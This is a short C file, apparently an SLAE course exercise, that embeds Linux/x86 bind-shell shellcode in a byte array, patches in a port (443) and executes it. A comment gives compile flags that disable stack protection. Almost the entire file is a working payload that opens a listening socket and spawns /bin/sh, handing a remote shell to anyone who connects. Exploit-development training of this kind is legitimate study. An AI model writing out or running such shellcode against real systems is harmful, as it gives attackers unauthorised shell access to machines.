/*
	Bind Shell - Linux/x86 Shellcode
	Author: Nathu Nandwani
	SecurityTube ID: SLAE-1261
*/

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>

//gcc -fno-stack-protector -z execstack execshell.c -o execshell

int main() 
{
	unsigned short port = 443;

	char code[] = "\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x01\x51\x41\x51\x41\x51\x89\xe1\xcd\x80\x31\xc9\xb3\x02\x51\x51\x51\x66\xb9\x01\xbb\xc1\xe1\x10\xb1\x02\x51\x89\xe6\x6a\x10\x56\x50\x89\xe1\xb0\x66\xcd\x80\xb3\x04\x31\xc0\x89\x44\x24\x04\x89\xe1\xb0\x66\xcd\x80\xb3\x05\x31\xc0\x89\x44\x24\x08\xb0\x66\xcd\x80\x89\xc3\x31\xc0\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x04\x75\xf6\xb0\x0b\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

	code[28] = (port >> 8) & 0xff;
	code[29] = port & 0xff; 

	printf("Shellcode length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
